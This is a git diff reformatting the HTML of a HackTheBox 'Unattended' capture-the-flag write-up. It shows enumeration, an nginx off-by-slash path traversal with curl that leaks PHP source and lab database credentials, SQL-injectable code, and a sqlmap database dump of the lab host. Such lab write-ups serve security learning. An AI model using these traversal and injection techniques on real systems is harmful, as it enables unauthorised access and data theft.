@@ -87,26 +87,23 @@
 
 <h2 id="quick-summary">Quick Summary</h2>
 <p><br> Hey guys today Unattended retired and here’s my write-up about it. Personally I think this box should have been rated as hard not medium, it really had a lot of stuff that were hard to find and exploit. There was an interesting <code class="highlighter-rouge">SQL</code> injection vulnerability that could be escalated to local file inclusion then to remote code execution and that’s my favorite part about this box. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.126</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">unattended.htb</code>. Let’s jump right in !
-<br>
-<img src="/images/hackthebox/unattended/0.png" alt=""></p>
+<br><img src="/images/hackthebox/unattended/0.png" alt=""><br></p>
 <hr>
 
 <h2 id="nmap">Nmap</h2>
 <p><br> As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :
-<code class="highlighter-rouge">nmap -sV -sT -sC unattended.htb</code>
-<img src="/images/hackthebox/unattended/1.png" alt="">
+<br><code class="highlighter-rouge">nmap -sV -sT -sC unattended.htb</code>
+<br><img src="/images/hackthebox/unattended/1.png" alt=""><br>
 <br> Only <code class="highlighter-rouge">http</code> and <code class="highlighter-rouge">https</code>, and surprisingly no <code class="highlighter-rouge">ssh</code>. Also the <code class="highlighter-rouge">ssl</code> certificate from the <code class="highlighter-rouge">https</code> port tells us that the common name is <code class="highlighter-rouge">www.nestedflanders.htb</code> so I added that to my hosts file :
-<img src="/images/hackthebox/unattended/2.png" alt=""></p>
+<br><img src="/images/hackthebox/unattended/2.png" alt=""><br></p>
 <hr>
 
 <h2 id="web-enumeration">Web Enumeration</h2>
 <p><br> Checking <code class="highlighter-rouge">unattended.htb</code> on both 80 and 443 gives us a blank page :
-<img src="/images/hackthebox/unattended/3.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/unattended/4.png" alt="">
+<br><img src="/images/hackthebox/unattended/3.png" alt=""><br>
+<br><img src="/images/hackthebox/unattended/4.png" alt=""><br>
 <br> <code class="highlighter-rouge">http://www.nestedflanders.htb</code> responds with a redirection to <code class="highlighter-rouge">https://www.nestedflanders.htb</code> which has the default Apache page :
-<img src="/images/hackthebox/unattended/5.png" alt="">
+<br><img src="/images/hackthebox/unattended/5.png" alt=""><br>
 <br> I used <code class="highlighter-rouge">wfuzz</code> to enumerate sub directories and it was weird to see both <code class="highlighter-rouge">index.php</code> and <code class="highlighter-rouge">index.html</code> with different content :</p>
 <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# wfuzz --hc 404 -c -u https://www.nestedflanders.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt 
 
@@ -134,16 +131,16 @@ ID   Response   Lines      Word         Chars          Payload
 </code></pre></div></div>
 <p><br> Also there was a sub directory called <code class="highlighter-rouge">/dev</code>.
 <br> <code class="highlighter-rouge">/dev</code> :
-<img src="/images/hackthebox/unattended/6.png" alt="">
+<br><img src="/images/hackthebox/unattended/6.png" alt=""><br>
 <br> <code class="highlighter-rouge">/index.html</code> :
-<img src="/images/hackthebox/unattended/7.png" alt="">
+<br><img src="/images/hackthebox/unattended/7.png" alt=""><br>
 <br> <code class="highlighter-rouge">/index.php</code>
-<img src="/images/hackthebox/unattended/8.png" alt=""></p>
+<br><img src="/images/hackthebox/unattended/8.png" alt=""><br></p>
 <hr>
 
 <h2 id="nginx-off-by-slash">Nginx off-by-slash</h2>
 <p><br> When I checked <a href="https://www.wappalyzer.com/" target="_blank" rel="noopener noreferrer"><code class="highlighter-rouge">wappalyzer</code></a> results I saw that it identified the web server as <code class="highlighter-rouge">nginx</code> and that was weird because we saw Apache’s default page. Also when I went to <code class="highlighter-rouge">https://www.nestedflanders.htb/dev</code> I got a redirection to <code class="highlighter-rouge">https://www.nestedflanders.htb/dev/</code> (It added a slash <code class="highlighter-rouge">/</code>).</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev
 <span class="nt">&lt;html&gt;</span>
 <span class="nt">&lt;head&gt;&lt;title&gt;</span>301 Moved Permanently<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
 <span class="nt">&lt;body</span> <span class="na">bgcolor=</span><span class="s">"white"</span><span class="nt">&gt;</span>
@@ -157,7 +154,7 @@ ID   Response   Lines      Word         Chars          Payload
 dev site has been moved to his own server
 </code></pre></div></div>
 <p><br> As demonstrated in <a href="https://i.blackhat.com/us-18/Wed-August-8/us-18-Orange-Tsai-Breaking-Parser-Logic-Take-Your-Path-Normalization-Off-And-Pop-0days-Out-2.pdf" target="_blank" rel="noopener noreferrer">this document</a> there can be a vulnerability because of this. I gave it a try by adding <code class="highlighter-rouge">..</code> after <code class="highlighter-rouge">dev</code>:</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../
+<div class="language-html highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../
 <span class="nt">&lt;html&gt;</span>
 <span class="nt">&lt;head&gt;&lt;title&gt;</span>403 Forbidden<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
 <span class="nt">&lt;body</span> <span class="na">bgcolor=</span><span class="s">"white"</span><span class="nt">&gt;</span>
@@ -167,7 +164,7 @@ dev site has been moved to his own server
 <span class="nt">&lt;/html&gt;</span>
 </code></pre></div></div>
 <p><br> We got <code class="highlighter-rouge">403</code> maybe because we are out of  <code class="highlighter-rouge">html</code> directory, I added <code class="highlighter-rouge">/html/index.php</code> and I successfully got the source of the index page :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html
 <span class="nt">&lt;html&gt;</span>
 <span class="nt">&lt;head&gt;&lt;title&gt;</span>301 Moved Permanently<span class="nt">&lt;/title&gt;&lt;/head&gt;</span>
 <span class="nt">&lt;body</span> <span class="na">bgcolor=</span><span class="s">"white"</span><span class="nt">&gt;</span>
@@ -176,55 +173,55 @@ dev site has been moved to his own server
 <span class="nt">&lt;/body&gt;</span>
 <span class="nt">&lt;/html&gt;</span>
 root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/index.php
-<span class="cp">&lt;?php
-$servername = "localhost";
-$username = "nestedflanders";
-$password = "1036913cf7d38d4ea4f79b050f171e9fbf3f5e";
-$db = "neddy";
-$conn = new mysqli($servername, $username, $password, $db);
-$debug = False;
+<span class="cp">&lt;?php</span>
+<span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"nestedflanders"</span><span class="p">;</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="s2">"1036913cf7d38d4ea4f79b050f171e9fbf3f5e"</span><span class="p">;</span>
+<span class="nv">$db</span> <span class="o">=</span> <span class="s2">"neddy"</span><span class="p">;</span>
+<span class="nv">$conn</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">mysqli</span><span class="p">(</span><span class="nv">$servername</span><span class="p">,</span> <span class="nv">$username</span><span class="p">,</span> <span class="nv">$password</span><span class="p">,</span> <span class="nv">$db</span><span class="p">);</span>
+<span class="nv">$debug</span> <span class="o">=</span> <span class="nx">False</span><span class="p">;</span>
 
-include "6fb17817efb4131ae4ae1acae0f7fd48.php";
+<span class="k">include</span> <span class="s2">"6fb17817efb4131ae4ae1acae0f7fd48.php"</span><span class="p">;</span>
 
-function getTplFromID($conn) {
-	global $debug;
-	$valid_ids = array (25,465,587);
-	if ( (array_key_exists('id', $_GET)) &amp;&amp; (intval($_GET['id']) == $_GET['id']) &amp;&amp; (in_array(intval($_GET['id']),$valid_ids)) ) {
-			$sql = "SELECT name FROM idname where id = '".$_GET['id']."'";
-	} else {
-		$sql = "SELECT name FROM idname where id = '25'";
-	}
-	if ($debug) { echo "sqltpl: $sql&lt;br&gt;\n"; } 
+<span class="k">function</span> <span class="nf">getTplFromID</span><span class="p">(</span><span class="nv">$conn</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">global</span> <span class="nv">$debug</span><span class="p">;</span>
+	<span class="nv">$valid_ids</span> <span class="o">=</span> <span class="k">array</span> <span class="p">(</span><span class="mi">25</span><span class="p">,</span><span class="mi">465</span><span class="p">,</span><span class="mi">587</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s1">'id'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]),</span><span class="nv">$valid_ids</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span>
+			<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT name FROM idname where id = '"</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="o">.</span><span class="s2">"'"</span><span class="p">;</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT name FROM idname where id = '25'"</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"sqltpl: </span><span class="nv">$sql</span><span class="s2">&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span> 
 	
-	$result = $conn-&gt;query($sql);
-	if ($result-&gt;num_rows &gt; 0) {
-	while($row = $result-&gt;fetch_assoc()) {
-		$ret = $row['name'];
-	}
-	} else {
-		$ret = 'main';
-	}
-	if ($debug) { echo "rettpl: $ret&lt;br&gt;\n"; }
-	return $ret;
-}
+	<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
+		<span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'name'</span><span class="p">];</span>
+	<span class="p">}</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="nv">$ret</span> <span class="o">=</span> <span class="s1">'main'</span><span class="p">;</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"rettpl: </span><span class="nv">$ret</span><span class="s2">&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span>
+	<span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
+<span class="p">}</span>
 
-function getPathFromTpl($conn,$tpl) {
-	global $debug;
-	$sql = "SELECT path from filepath where name = '".$tpl."'";
-	if ($debug) { echo "sqlpath: $sql&lt;br&gt;\n"; }
-	$result = $conn-&gt;query($sql);
-	if ($result-&gt;num_rows &gt; 0) {
-		while($row = $result-&gt;fetch_assoc()) {
-			$ret = $row['path'];
-		}
-	}
-	if ($debug) { echo "retpath: $ret&lt;br&gt;\n"; }
-	return $ret;
-}
+<span class="k">function</span> <span class="nf">getPathFromTpl</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span><span class="nv">$tpl</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">global</span> <span class="nv">$debug</span><span class="p">;</span>
+	<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT path from filepath where name = '"</span><span class="o">.</span><span class="nv">$tpl</span><span class="o">.</span><span class="s2">"'"</span><span class="p">;</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"sqlpath: </span><span class="nv">$sql</span><span class="s2">&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span>
+	<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+		<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
+			<span class="nv">$ret</span> <span class="o">=</span> <span class="nv">$row</span><span class="p">[</span><span class="s1">'path'</span><span class="p">];</span>
+		<span class="p">}</span>
+	<span class="p">}</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"retpath: </span><span class="nv">$ret</span><span class="s2">&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span>
+	<span class="k">return</span> <span class="nv">$ret</span><span class="p">;</span>
+<span class="p">}</span>
 
-$tpl = getTplFromID($conn);
-$inc = getPathFromTpl($conn,$tpl);
-?&gt;</span>
+<span class="nv">$tpl</span> <span class="o">=</span> <span class="nx">getTplFromID</span><span class="p">(</span><span class="nv">$conn</span><span class="p">);</span>
+<span class="nv">$inc</span> <span class="o">=</span> <span class="nx">getPathFromTpl</span><span class="p">(</span><span class="nv">$conn</span><span class="p">,</span><span class="nv">$tpl</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
 
 <span class="cp">&lt;!DOCTYPE html&gt;</span>
 <span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
@@ -244,26 +241,26 @@ $inc = getPathFromTpl($conn,$tpl);
 
 <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;div</span> <span class="na">center</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
-<span class="cp">&lt;?php
+<span class="cp">&lt;?php</span>
 
-$sql = "SELECT i.id,i.name from idname as i inner join filepath on i.name = filepath.name where disabled = '0' order by i.id";
-if ($debug) { echo "sql: $sql&lt;br&gt;\n"; }
+<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT i.id,i.name from idname as i inner join filepath on i.name = filepath.name where disabled = '0' order by i.id"</span><span class="p">;</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"sql: </span><span class="nv">$sql</span><span class="s2">&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span>
 
-$result = $conn-&gt;query($sql);
-if ($result-&gt;num_rows &gt; 0) {
-	while($row = $result-&gt;fetch_assoc()) {
-		//if ($debug) { echo "rowid: ".$row['id']."&lt;br&gt;\n"; } // breaks layout
-		echo '&lt;div class="col-md-2"&gt;&lt;a href="index.php?id='.$row['id'].'" target="maifreim"&gt;'.$row['name'].'&lt;/a&gt;&lt;/div&gt;';
-		}
-} else {
-?&gt;</span>
+<span class="nv">$result</span> <span class="o">=</span> <span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">query</span><span class="p">(</span><span class="nv">$sql</span><span class="p">);</span>
+<span class="k">if</span> <span class="p">(</span><span class="nv">$result</span><span class="o">-&gt;</span><span class="na">num_rows</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+	<span class="k">while</span><span class="p">(</span><span class="nv">$row</span> <span class="o">=</span> <span class="nv">$result</span><span class="o">-&gt;</span><span class="na">fetch_assoc</span><span class="p">())</span> <span class="p">{</span>
+		<span class="c1">//if ($debug) { echo "rowid: ".$row['id']."&lt;br&gt;\n"; } // breaks layout
+</span>		<span class="k">echo</span> <span class="s1">'&lt;div class="col-md-2"&gt;&lt;a href="index.php?id='</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="o">.</span><span class="s1">'" target="maifreim"&gt;'</span><span class="o">.</span><span class="nv">$row</span><span class="p">[</span><span class="s1">'name'</span><span class="p">]</span><span class="o">.</span><span class="s1">'&lt;/a&gt;&lt;/div&gt;'</span><span class="p">;</span>
+		<span class="p">}</span>
+<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+<span class="cp">?&gt;</span>
 	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-2"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?id=25"</span><span class="nt">&gt;</span>main<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
 	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-2"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?id=465"</span><span class="nt">&gt;</span>about<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
 	<span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-md-2"</span><span class="nt">&gt;&lt;a</span> <span class="na">href=</span><span class="s">"index.php?id=587"</span><span class="nt">&gt;</span>contact<span class="nt">&lt;/a&gt;&lt;/div&gt;</span>
-	<span class="cp">&lt;?php
-}
+	<span class="cp">&lt;?php</span>
+<span class="p">}</span>
 
-?&gt;</span>
+<span class="cp">?&gt;</span>
 <span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- row --&gt;</span>
 <span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- container --&gt;</span>
 
@@ -271,77 +268,74 @@ if ($result-&gt;num_rows &gt; 0) {
 <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"container"</span><span class="nt">&gt;</span>
 <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"row"</span><span class="nt">&gt;</span>
 <span class="c">&lt;!-- &lt;div align="center"&gt; --&gt;</span>
-<span class="cp">&lt;?php
-include("$inc");
-?&gt;</span>
+<span class="cp">&lt;?php</span>
+<span class="k">include</span><span class="p">(</span><span class="s2">"</span><span class="nv">$inc</span><span class="s2">"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
 <span class="c">&lt;!-- &lt;/div&gt; --&gt;</span>
 
 <span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- row --&gt;</span>
 <span class="nt">&lt;/div&gt;</span> <span class="c">&lt;!-- container --&gt;</span>
-<span class="cp">&lt;?php if ($debug) { echo "include $inc;&lt;br&gt;\n"; } ?&gt;</span>
+<span class="cp">&lt;?php</span> <span class="k">if</span> <span class="p">(</span><span class="nv">$debug</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">"include </span><span class="nv">$inc</span><span class="s2">;&lt;br&gt;</span><span class="se">\n</span><span class="s2">"</span><span class="p">;</span> <span class="p">}</span> <span class="cp">?&gt;</span>
 
 <span class="nt">&lt;/body&gt;</span>
 <span class="nt">&lt;/html&gt;</span>
 
-<span class="cp">&lt;?php
-$conn-&gt;close();
-?&gt;</span>
+<span class="cp">&lt;?php</span>
+<span class="nv">$conn</span><span class="o">-&gt;</span><span class="na">close</span><span class="p">();</span>
+<span class="cp">?&gt;</span>
 </code></pre></div></div>
 <hr>
 
 <p><br></p>
 <h2 id="sqli">SQLI</h2>
 <p><br> By looking at the <code class="highlighter-rouge">php</code> code we can see database credentials :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$servername = "localhost";
-$username = "nestedflanders";
-$password = "1036913cf7d38d4ea4f79b050f171e9fbf3f5e";
-$db = "neddy";
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$servername</span> <span class="o">=</span> <span class="s2">"localhost"</span><span class="p">;</span>
+<span class="nv">$username</span> <span class="o">=</span> <span class="s2">"nestedflanders"</span><span class="p">;</span>
+<span class="nv">$password</span> <span class="o">=</span> <span class="s2">"1036913cf7d38d4ea4f79b050f171e9fbf3f5e"</span><span class="p">;</span>
+<span class="nv">$db</span> <span class="o">=</span> <span class="s2">"neddy"</span><span class="p">;</span>
 </code></pre></div></div>
 <p><br> Those can be helpful later.
 <br> Another thing I noticed was this include :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>include "6fb17817efb4131ae4ae1acae0f7fd48.php";
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">include</span> <span class="s2">"6fb17817efb4131ae4ae1acae0f7fd48.php"</span><span class="p">;</span>
 </code></pre></div></div>
 <p><br> I downloaded that page but it had nothing interesting :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/6fb17817efb4131ae4ae1acae0f7fd48.php
-&lt;?php
-session_start();
-if (isset($_SESSION['user_name'])){
-        $user_name = $_SESSION['user_name'];
-}
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# curl -k https://www.nestedflanders.htb/dev../html/6fb17817efb4131ae4ae1acae0f7fd48.php
+<span class="cp">&lt;?php</span>
+<span class="nb">session_start</span><span class="p">();</span>
+<span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user_name'</span><span class="p">])){</span>
+        <span class="nv">$user_name</span> <span class="o">=</span> <span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">'user_name'</span><span class="p">];</span>
+<span class="p">}</span>
 
-foreach ($_COOKIE as $key =&gt; $val) {
-        $_SESSION[$key] = $val;
-}
+<span class="k">foreach</span> <span class="p">(</span><span class="nv">$_COOKIE</span> <span class="k">as</span> <span class="nv">$key</span> <span class="o">=&gt;</span> <span class="nv">$val</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nv">$_SESSION</span><span class="p">[</span><span class="nv">$key</span><span class="p">]</span> <span class="o">=</span> <span class="nv">$val</span><span class="p">;</span>
+<span class="p">}</span>
 
-/* removed everything because of undergoing investigation, please check dev and staging */
+<span class="cm">/* removed everything because of undergoing investigation, please check dev and staging */</span>
 </code></pre></div></div>
 <p><br> We can also see this :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>$valid_ids = array (25,465,587);
-	if ( (array_key_exists('id', $_GET)) &amp;&amp; (intval($_GET['id']) == $_GET['id']) &amp;&amp; (in_array(intval($_GET['id']),$valid_ids)) ) {
-			$sql = "SELECT name FROM idname where id = '".$_GET['id']."'";
-	} else {
-		$sql = "SELECT name FROM idname where id = '25'";
-	}
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nv">$valid_ids</span> <span class="o">=</span> <span class="k">array</span> <span class="p">(</span><span class="mi">25</span><span class="p">,</span><span class="mi">465</span><span class="p">,</span><span class="mi">587</span><span class="p">);</span>
+	<span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="nb">array_key_exists</span><span class="p">(</span><span class="s1">'id'</span><span class="p">,</span> <span class="nv">$_GET</span><span class="p">))</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">==</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">])</span> <span class="o">&amp;&amp;</span> <span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nb">intval</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]),</span><span class="nv">$valid_ids</span><span class="p">))</span> <span class="p">)</span> <span class="p">{</span>
+			<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT name FROM idname where id = '"</span><span class="o">.</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'id'</span><span class="p">]</span><span class="o">.</span><span class="s2">"'"</span><span class="p">;</span>
+	<span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+		<span class="nv">$sql</span> <span class="o">=</span> <span class="s2">"SELECT name FROM idname where id = '25'"</span><span class="p">;</span>
+	<span class="p">}</span>
 </code></pre></div></div>
 <p><br> It defines an array called <code class="highlighter-rouge">valid_ids</code>, then it checks the <code class="highlighter-rouge">GET</code> parameter <code class="highlighter-rouge">id</code>, if it exists and it’s in the <code class="highlighter-rouge">valid_ids</code> array, it will append it to this <code class="highlighter-rouge">SQL</code> query : <code class="highlighter-rouge">SELECT name FROM idname where id = [ID HERE]</code>.
 <br> To understand what’s happening in a better way let’s check the website again.
-<img src="/images/hackthebox/unattended/8.png" alt="">
+<br><img src="/images/hackthebox/unattended/8.png" alt=""><br>
 <br> There are 3 pages, <code class="highlighter-rouge">main</code>, <code class="highlighter-rouge">about</code> and <code class="highlighter-rouge">contact</code>.  By visiting them we notice that the <code class="highlighter-rouge">id</code> parameter is added and each page has one of the ids we saw in the <code class="highlighter-rouge">php</code> code : 25 (main), 465 (about) and 587 (contact).
-<img src="/images/hackthebox/unattended/9.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/unattended/10.png" alt="">
-<br>
-<br>
-<img src="/images/hackthebox/unattended/11.png" alt="">
+<br><img src="/images/hackthebox/unattended/9.png" alt=""><br>
+<br><img src="/images/hackthebox/unattended/10.png" alt=""><br>
+<br><img src="/images/hackthebox/unattended/11.png" alt=""><br>
 <br> I tried adding a single quote to <code class="highlighter-rouge">https://www.nestedflanders.htb/index.php?id=465</code> and I got the main page instead of the about page because the query failed :
-<img src="/images/hackthebox/unattended/12.png" alt="">
+<br><img src="/images/hackthebox/unattended/12.png" alt=""><br>
 <br> When I fixed the query it worked :
-<img src="/images/hackthebox/unattended/13.png" alt="">
+<br><img src="/images/hackthebox/unattended/13.png" alt=""><br>
 <br> I started <code class="highlighter-rouge">sqlmap</code> to automate it and dump the database :</p>
-<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/unattended# sqlmap -u https://www.nestedflanders.htb/index.php?id=465 --dump-all
-       __H__
-___ ___ ["]_____ ___ ___  {1.3.4#stable}
+
+<div class="language-sql highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">root</span><span class="o">@</span><span class="n">kali</span><span class="p">:</span><span class="o">~/</span><span class="n">Desktop</span><span class="o">/</span><span class="n">HTB</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">unattended</span><span class="o">#</span> <span class="n">sqlmap</span> <span class="o">-</span><span class="n">u</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">www</span><span class="p">.</span><span class="n">nestedflanders</span><span class="p">.</span><span class="n">htb</span><span class="o">/</span><span class="k">index</span><span class="p">.</span><span class="n">php</span><span class="o">?</span><span class="n">id</span><span class="o">=</span><span class="mi">465</span> <span class="c1">--dump-all</span>
+       <span class="n">__H__</span>
+<span class="n">___</span> <span class="n">___</span> <span class="p">[</span><span class="nv">"]_____ ___ ___  {1.3.4#stable}
 |_ -| . [.]     | .'| . |                                                                   
 |___|_  [']_|_|_|__,|  _|                                                                   
       |_|V...       |_|   http://sqlmap.org                                                                           
@@ -358,7 +352,7 @@ ___ ___ ["]_____ ___ ___  {1.3.4#stable}
 [17:12:15] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
 [17:12:16] [INFO] testing for SQL injection on GET parameter 'id'
 [17:12:16] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
-[17:12:25] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="form")
+[17:12:25] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="</span><span class="n">form</span><span class="nv">")
 [17:12:34] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
 it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] n
 for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y 
@@ -434,110 +428,110 @@ Parameter: id (GET)
 web application technology: Nginx 1.10.3
 back-end DBMS: MySQL &gt;= 5.0.12
 [17:16:20] [INFO] sqlmap will dump entries of all tables from all databases now
-</code></pre></div></div>
+</span></code></pre></div></div>
